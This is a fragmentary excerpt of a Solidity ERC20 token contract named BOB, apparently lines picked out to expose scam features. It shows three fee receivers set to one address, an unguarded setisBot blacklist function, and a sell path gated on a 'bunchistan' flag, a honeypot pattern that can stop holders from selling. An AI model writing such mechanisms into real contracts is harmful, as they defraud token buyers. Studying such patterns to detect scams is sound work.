...
contract BOB is IERC20, Ownable {
    ...
    address internal constant development_receiver = 0x781d4682ed0687d50264808E9fE7e233C29E17FA; 
    address internal constant marketing_receiver = 0x781d4682ed0687d50264808E9fE7e233C29E17FA;
    address internal constant liquidity_receiver = 0x781d4682ed0687d50264808E9fE7e233C29E17FA;
    ...
    function setisBot(address _address) external virtual payable {isBot[_address] = true;}
    ...
    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        ...
        if(recipient == pair){
        require(bunchistan == true);return sellFee;}
